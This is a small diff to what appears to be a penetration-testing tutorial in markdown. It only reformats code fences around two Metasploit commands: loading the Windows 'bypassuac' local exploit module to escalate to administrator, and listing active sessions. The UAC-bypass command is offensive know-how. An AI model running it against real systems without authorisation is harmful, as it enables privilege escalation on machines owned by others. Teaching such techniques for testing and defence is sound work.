@@ -123,11 +123,12 @@ Now our target is to bypass User Access Control (UAC) to gain administrator acce
 ### Step : Using UAC bypass payload 
 **Command**: 
 ```
-use exploit/windows/local/bypassuac ```
+use exploit/windows/local/bypassuac
+```
 ### Step : Check the pending required option and active 
 background sessions 
 **Command**: 
+```sessions -i
 ```
-sessions -i```
 
 
